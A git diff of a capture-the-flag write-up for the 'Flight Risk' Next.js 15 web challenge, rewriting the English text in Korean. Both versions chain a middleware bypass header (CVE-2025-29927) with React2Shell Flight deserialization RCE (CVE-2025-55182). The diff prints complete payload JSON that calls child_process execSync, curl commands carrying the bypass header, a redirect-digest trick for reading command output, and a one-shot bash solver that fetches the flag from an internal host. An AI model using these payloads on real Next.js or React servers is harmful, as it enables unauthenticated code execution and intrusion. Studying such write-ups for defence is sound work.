@@ -14,70 +14,59 @@ comments: false
 
 - **Name:** Flight Risk
 - **Category:** Web
-- **Difficulty:** ★★★☆☆ (411 points, solving 68 out of 887 teams)
+- **Difficulty:** ★★★☆☆ (411 points, 68 solves / 887 teams)
+- **Connection:** `http://chall.ehax.in:4269`
+- **Flag format:** `EHAX{...}`
 
 ---
 
-## TL;DR
+### 개요
 
-This challenge chains **two critical CVEs** against a Next.js 15 application:
+`System.Greet()`라는 이름 입력 폼이 있는 Next.js 15 앱입니다.
+이름을 입력하면 인사말을 돌려줍니다. 겉으로 보이는 건 이게 전부입니다.
 
-1. **CVE-2025-29927** — Bypass the middleware WAF by spoofing an internal header
-2. **CVE-2025-55182** (React2Shell) — Achieve RCE through the RSC Flight protocol deserialization bug
-
-With RCE on the server, we discover an internal service at `internal-vault:9009` and fetch the flag from it.
-
-**Flag:** `EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}`
-
----
-
-## Overview
-
-The target is a simple Next.js 15 web app with a text input form called `System.Greet()`. You type a name, it greets you back. That's it — on the surface.
-
-Behind the scenes, the app has three layers:
-
-```
-Internet
-   │
-   ▼
-┌──────────┐    ┌──────────────┐    ┌────────────────┐
-│  nginx   │───▶│  Next.js 15  │───▶│ internal-vault │
-│ (proxy)  │    │ (middleware   │    │   :9009        │
-│          │    │  acts as WAF) │    │ (flag.txt)     │
-└──────────┘    └──────────────┘    └────────────────┘
-```
-
-- **nginx** forwards traffic to Next.js
-- **Next.js middleware** inspects every request and blocks malicious payloads (WAF)
-- **internal-vault** is a hidden service on port 9009 that holds the flag
-
-Our goal: bypass the WAF, get code execution, and reach the internal service.
-
----
-
-## Solution
-
-### 1) Recon
-
-#### What we see
-
-Visiting `http://chall.ehax.in:4269/` shows a dark-themed terminal UI with a form. The response headers tell us:
+응답 헤더를 보면:
 
 ```
 Server: nginx/1.29.5
 X-Powered-By: Next.js
 ```
 
-#### Finding the Server Action
+서비스 구조는 세 겹입니다.
 
-Next.js bundles client-side JavaScript. We can read it to understand the app logic:
+```
+인터넷
+  │
+  ▼
+nginx (프록시)
+  │
+  ▼
+Next.js 15 (미들웨어 WAF)
+  │
+  ▼
+internal-vault:9009 (flag.txt)
+```
+
+미들웨어가 WAF 역할을 하고,
+플래그는 외부에서 접근할 수 없는 내부 서비스에 있습니다.
+
+문제 이름 **"FLIGHT RISK"** 가 핵심 힌트입니다.
+React에서 **Flight**는 RSC(React Server Components)가
+클라이언트와 서버 사이에 데이터를 주고받을 때 사용하는 프로토콜 이름입니다.
+
+---
+
+### 소스 분석
+
+#### 클라이언트 JS에서 Server Action 발견
+
+Next.js가 번들한 클라이언트 JS를 읽어봅니다.
 
 ```
 GET /_next/static/chunks/app/page-428009e448e772a0.js
 ```
 
-Inside, we find:
+안에서 이런 코드가 보입니다.
 
 ```javascript
 createServerReference(
@@ -87,113 +76,95 @@ createServerReference(
 );
 ```
 
-This is a **Server Action** — a function that runs on the server when you submit the form. The long hex string is its unique ID.
+**Server Action**입니다.
+폼을 제출하면 서버에서 실행되는 함수이고,
+긴 hex 문자열이 그 함수의 고유 ID입니다.
 
-#### The hint in the name
+#### 빌드 매니페스트 — 숨겨진 라우트
 
-The challenge is called **"FLIGHT RISK"**.
+빌드 매니페스트에서 Bloom 필터로 정의된 라우트 3개를 확인할 수 있지만
+`/`만 접근됩니다.
+`/vault`는 404입니다.
 
-In React, **Flight** is the name of the protocol used by React Server Components (RSC) to send data between client and server. This is a big hint pointing us toward a Flight protocol vulnerability.
-
-#### Looking for hidden routes
-
-The build manifest reveals a **Bloom filter** with 3 static routes, but only `/` is accessible. Requesting `/vault` returns 404. However, the challenge description says *"the vault is still open"* — so the vault must exist somewhere internally.
+문제 설명에 *"the vault is still open"* 이라는 힌트가 있으니,
+vault는 내부적으로 존재합니다.
+직접 접근할 수 없을 뿐입니다.
 
 ---
 
-### 2) Root Cause
+### 취약점 분석
 
-This challenge exploits two vulnerabilities together.
+두 CVE를 체이닝합니다.
 
-#### Vulnerability #1 — CVE-2025-29927 (Middleware Bypass)
+#### CVE-2025-29927 — 미들웨어 WAF 우회
 
-Next.js uses a special header called `x-middleware-subrequest` internally. This header tells the framework: *"This request already went through middleware, don't run it again."* It exists to prevent infinite loops.
+Next.js는 미들웨어 내부에서 무한 루프를 방지하기 위해
+`x-middleware-subrequest`라는 헤더를 사용합니다.
+이 헤더가 있으면 미들웨어를 다시 실행하지 않습니다.
 
-The bug: **anyone can send this header from the outside**. If you include it in your request, Next.js skips all middleware — including any security checks.
+문제는 **외부에서도 이 헤더를 보낼 수 있다**는 점입니다.
+헤더를 포함해서 요청하면 미들웨어(WAF) 전체를 건너뜁니다.
 
-For Next.js 15, the magic value is:
+Next.js 15에서 동작하는 값은 이렇습니다.
 
 ```
 x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 ```
 
-In this challenge, the middleware acts as a **WAF** (Web Application Firewall). It inspects request bodies for suspicious patterns and blocks them. By adding this header, we bypass the WAF completely.
-
-**Proof:**
+확인해봅니다.
 
 ```bash
-# Without bypass → blocked
-curl -X POST http://chall.ehax.in:4269/ \
+# 헤더 없이 → WAF 차단
+curl -X POST "http://chall.ehax.in:4269/" \
   -H "Next-Action: x" \
   -F '0={"then":"$1:__proto__:then"}'
 # → {"error":"WAF Alert: Malicious payload detected."}
 
-# With bypass → goes through
-curl -X POST http://chall.ehax.in:4269/ \
+# 헤더 추가 → 통과
+curl -X POST "http://chall.ehax.in:4269/" \
   -H "Next-Action: x" \
   -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
   -F '0={"then":"$1:__proto__:then"}'
-# → Server processes the request
+# → 서버가 요청 처리
 ```
 
-#### Vulnerability #2 — CVE-2025-55182 (React2Shell)
+#### CVE-2025-55182 — React2Shell (CVSS 10.0)
 
-This is a **CVSS 10.0** vulnerability disclosed in December 2025. It allows unauthenticated Remote Code Execution (RCE) on any server running React Server Components.
+2025년 12월에 공개된 RCE 취약점입니다.
+RSC의 Flight 프로토콜 역직렬화 과정에서 임의 코드가 실행됩니다.
 
-**How it works, simply explained:**
+동작 원리를 단계별로 보면 이렇습니다.
 
-React Server Components use the "Flight" protocol to exchange data. When the server receives data from the client, it **deserializes** it — turning text back into JavaScript objects.
+```
+Flight 역직렬화 시작
+  │
+  ├─ "$1:__proto__:then"
+  │   → chunk 객체의 프로토타입 체인을 따라 올라감
+  │
+  ├─ "$1:constructor:constructor"
+  │   → Function 생성자에 도달
+  │
+  └─ _prefix 값이 Function()에 전달됨
+      → 임의 JavaScript 실행
+```
 
-The problem: the deserializer doesn't check if the data is safe. An attacker can craft a payload that:
+역직렬화 과정에서 `$1:property` 형태 참조가
+프로토타입 체인을 타고 올라가는 것을 막지 않기 때문에
+`Function` 생성자까지 도달할 수 있습니다.
 
-1. Walks up the JavaScript **prototype chain** (`__proto__`)
-2. Reaches the **Function constructor** (`constructor.constructor`)
-3. Passes arbitrary code to it
-4. The server **executes that code**
-
-Think of it like this: you're allowed to send a package to a factory. The factory opens every package and runs whatever instructions are inside — without checking if the instructions are dangerous.
-
-**Key detail:** The RCE happens **during deserialization**, before the server even validates the action ID. So you can use any `Next-Action` header value — even `Next-Action: x`.
+**중요한 점:** RCE는 역직렬화 시점에 발생합니다.
+Action ID 검증 전이라서 `Next-Action: x` 같은 아무 값이나 써도 됩니다.
 
 ---
 
-### 3) Exploit
+### 출력 탈취 방법 — NEXT_REDIRECT 트릭
 
-#### Step 1 — Craft the RCE payload
+프로덕션 Next.js는 에러 메시지를 해시로 가립니다.
+`throw new Error(result)`로는 결과를 읽을 수 없습니다.
 
-The payload is a JSON object that abuses the Flight protocol's reference system:
-
-```json
-{
-  "then": "$1:__proto__:then",
-  "status": "resolved_model",
-  "reason": -1,
-  "value": "{\"then\":\"$B1337\"}",
-  "_response": {
-    "_prefix": "<CODE_TO_EXECUTE>",
-    "_chunks": "$Q2",
-    "_formData": {
-      "get": "$1:constructor:constructor"
-    }
-  }
-}
-```
-
-What each field does:
-
-| Field | Purpose |
-|-------|---------|
-| `then: "$1:__proto__:then"` | Traverses prototype chain to reach `Chunk.prototype.then` |
-| `status: "resolved_model"` | Makes the deserializer treat this as a resolved chunk |
-| `value: '{"then":"$B1337"}'` | Triggers a Blob reference, which calls `_formData.get()` |
-| `_formData.get: "$1:constructor:constructor"` | Points to the JavaScript `Function` constructor |
-| `_prefix` | The code passed to `Function()` — this is what gets executed |
-
-#### Step 2 — Exfiltrate output
-
-In production, Next.js strips error details. We can't just `throw new Error(output)` and read it.
-
-**The trick:** Next.js has special handling for redirect errors. If we throw an error with a `NEXT_REDIRECT` digest, it returns a **303 redirect** and puts our URL in the `x-action-redirect` header.
+Next.js에는 리다이렉트 에러를 위한 특별 처리가 있습니다.
+`digest`에 `NEXT_REDIRECT`가 있으면 `x-action-redirect` 헤더로 URL을 반환합니다.
+이 헤더는 해싱되지 않습니다.
 
 ```javascript
 var result = process.mainModule
@@ -207,11 +178,19 @@ throw Object.assign(
 );
 ```
 
-The command output appears URL-encoded in the response header. Clean and reliable.
+명령 출력이 `x-action-redirect` 헤더에 URL 인코딩되어 나옵니다.
 
-#### Step 3 — Avoid shell issues
+---
 
-The payload contains `$` characters (like `$1`, `$B1337`, `$Q2`). Bash interprets `$` as variable expansion, which corrupts the payload. Solution: **write the payload to a file** using a quoted heredoc:
+### Exploit 실행 과정
+
+**페이로드의 `$` 문자 문제**
+
+페이로드에 `$1`, `$B1337`, `$Q2` 같은 값이 있습니다.
+bash는 `$`를 변수로 해석해서 페이로드가 망가집니다.
+**quoted heredoc**으로 파일에 저장해서 해결합니다.
+
+**Step 1 — 페이로드 파일 생성**
 
 ```bash
 cat > /tmp/payload0.txt << 'EOF'
@@ -219,10 +198,10 @@ cat > /tmp/payload0.txt << 'EOF'
 EOF
 
 echo -n '"$@0"' > /tmp/payload1.txt
-echo -n '[]' > /tmp/payload2.txt
+echo -n '[]'    > /tmp/payload2.txt
 ```
 
-Then send it with curl's file input syntax (`-F "0=</tmp/file"`):
+**Step 2 — RCE 및 서버 탐색**
 
 ```bash
 curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
@@ -234,51 +213,25 @@ curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
   -F "2=</tmp/payload2.txt"
 ```
 
-> **Note:** The `?r=$(date +%s%N)` query parameter is for **cache busting**. Next.js caches server action responses, so each request needs a unique URL to ensure the code actually runs.
+> `?r=$(date +%s%N)` 는 캐시 버스팅입니다.
+> Next.js가 Server Action 응답을 캐싱하므로
+> 매번 다른 URL이어야 실제로 실행됩니다.
 
-#### Step 4 — Explore the server
-
-Running `ls /` through RCE, the response header shows:
+응답 헤더:
 
 ```
 x-action-redirect: /app%0Abin%0Adev%0Aetc%0A...
 ```
 
-URL-decoded: `app, bin, dev, etc, home, lib, ...`
-
-Listing `/app/` reveals:
-
-```
-.next/
-node_modules/
-package.json
-server.js
-vault.hint       ← interesting!
-```
-
-Reading `vault.hint`:
+`/app/`을 열어보면 `vault.hint` 파일이 보입니다.
 
 ```
 internal-vault:9009
 ```
 
-#### Step 5 — Access the internal service
+**Step 3 — 내부 서비스에서 플래그 읽기**
 
-Curling the internal service from the server:
-
-```bash
-# Command: curl -s http://internal-vault:9009/
-```
-
-Returns a directory listing with `flag.txt`.
-
-#### Step 6 — Get the flag
-
-```bash
-# Command: curl -s http://internal-vault:9009/flag.txt
-```
-
-The final payload:
+명령어를 `curl -s http://internal-vault:9009/flag.txt`로 교체합니다.
 
 ```bash
 cat > /tmp/getflag.txt << 'EOF'
@@ -294,103 +247,72 @@ curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
   -F "2=</tmp/payload2.txt"
 ```
 
-Response:
+응답:
 
 ```
-HTTP/1.1 303 See Other
 x-action-redirect: /EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
 ```
 
-**Flag: `EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}`**
-
-> "1 more reason to use Angular" — a funny jab at React/Next.js security 😄
-
 ---
 
-### 4) Why It Works
-
-Let's walk through the full chain and why each step is necessary.
-
-#### Why do we need the middleware bypass?
-
-The Next.js middleware inspects every incoming request body. If it detects suspicious patterns like `__proto__` or `constructor`, it blocks the request with a WAF alert. The React2Shell payload is full of these patterns, so it **cannot reach the server** without bypassing the middleware first.
-
-#### Why does the React2Shell payload work?
-
-The Flight protocol deserializer uses a reference system where `$1:property` means "look up property on chunk #1." The deserializer doesn't check whether the property is a **real export** or a **prototype chain property**. So `$1:__proto__:then` walks from the chunk object up to `Object.prototype`, giving the attacker access to `constructor` — which is the `Function` constructor. Any string passed to `Function()` becomes executable JavaScript.
-
-#### Why do we need NEXT_REDIRECT for exfiltration?
-
-In production mode, Next.js hashes all error messages for security. A normal `throw new Error(data)` becomes `E{"digest":"1158153724"}` — a useless hash. But Next.js has special handling for redirect errors: it reads the `digest` field, parses out the URL, and sets it as the `x-action-redirect` header. This header is **not hashed**, so we can read our command output from it.
-
-#### Why does the flag require internal SSRF?
-
-The flag is not on the Next.js server itself. It's on a separate internal service (`internal-vault:9009`) that is **not exposed to the internet**. Only the Next.js server can reach it over the internal Docker network. So we need RCE on the Next.js server to make a request to the internal service — effectively turning our RCE into SSRF.
-
-#### Full attack flow
-
-```
-Attacker
-   │
-   │ POST / with:
-   │   • x-middleware-subrequest (bypass WAF)
-   │   • React2Shell payload (Flight deserialization RCE)
-   │   • Command: curl http://internal-vault:9009/flag.txt
-   │
-   ▼
-┌──────────┐  header bypasses  ┌──────────────┐  curl from   ┌────────────────┐
-│  nginx   │ ───────────────▶  │  Next.js 15  │ ──────────▶  │ internal-vault │
-│          │                   │  (WAF skip)  │              │   :9009        │
-│          │  ◀─── 303 ─────── │  (RCE runs)  │ ◀── flag ─── │  flag.txt      │
-└──────────┘  x-action-redirect└──────────────┘              └────────────────┘
-   │          contains flag
-   ▼
-Attacker reads flag from response header
-```
-
----
-
-## Solver
-
-A complete one-shot solver script:
+### Solver (bash)
 
 ```bash
 #!/bin/bash
 TARGET="http://chall.ehax.in:4269"
 
-# Payload files (using quoted heredoc to prevent $ expansion)
 cat > /tmp/p0.txt << 'EOF'
 {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('curl -s http://internal-vault:9009/flag.txt').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
 EOF
 echo -n '"$@0"' > /tmp/p1.txt
-echo -n '[]' > /tmp/p2.txt
+echo -n '[]'    > /tmp/p2.txt
 
-# Send exploit: middleware bypass + React2Shell RCE
 FLAG=$(curl -s -D- -X POST "${TARGET}/?r=${RANDOM}" \
   -H "Next-Action: x" \
   -H "Accept: text/x-component" \
   -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
   -F "0=</tmp/p0.txt" \
   -F "1=</tmp/p1.txt" \
-  -F "2=</tmp/p2.txt" 2>/dev/null \
+  -F "2=</tmp/p2.txt" \
   | grep -oP 'x-action-redirect: /\K[^;]+')
 
-echo "Flag: $(python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))")"
-```
-
-Output:
-
-```
-Flag: EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
+python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))"
 ```
 
 ---
-<img width="1228" height="335" alt="스크린샷 2026-03-01 125232" src="https://github.com/user-attachments/assets/9188bbd9-a7e6-4b71-9676-8dfc9116e211" />
+
+### FLAG
+
+```
+EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
+```
+
+> "1 more reason to use Angular" — React/Next.js 보안에 대한 유머 😄
+
 ---
 
-## References
+### 요약
+
+이 문제의 핵심은 **두 CVE의 체이닝**입니다.
+
+**CVE-2025-29927** — `x-middleware-subrequest` 헤더를 외부에서 보낼 수 있어
+Next.js 미들웨어 전체를 건너뜁니다.
+WAF가 React2Shell 페이로드를 막지 못하게 됩니다.
+
+**CVE-2025-55182** — Flight 역직렬화에서 `$1:property` 참조가
+프로토타입 체인을 무제한으로 탐색합니다.
+`Function` 생성자까지 도달해 임의 코드를 실행합니다.
+
+플래그는 Next.js 서버 자체에 없고 내부 네트워크의 `internal-vault`에 있어,
+RCE를 SSRF로 전환해 curl로 가져오는 추가 단계가 필요합니다.
+
+출력 탈취에는 `NEXT_REDIRECT` 다이제스트 트릭을 사용해
+에러 해싱 없이 결과를 헤더로 받습니다.
+
+---
+
+### References
 
 - [CVE-2025-29927 — Next.js Middleware Bypass](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
-- [CVE-2025-55182 — React2Shell RCE (OffSec)](https://www.offsec.com/blog/cve-2025-55182/)
+- [CVE-2025-55182 — React2Shell (OffSec)](https://www.offsec.com/blog/cve-2025-55182/)
 - [React2Shell Deep Dive (Wiz Research)](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
-- [React Security Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
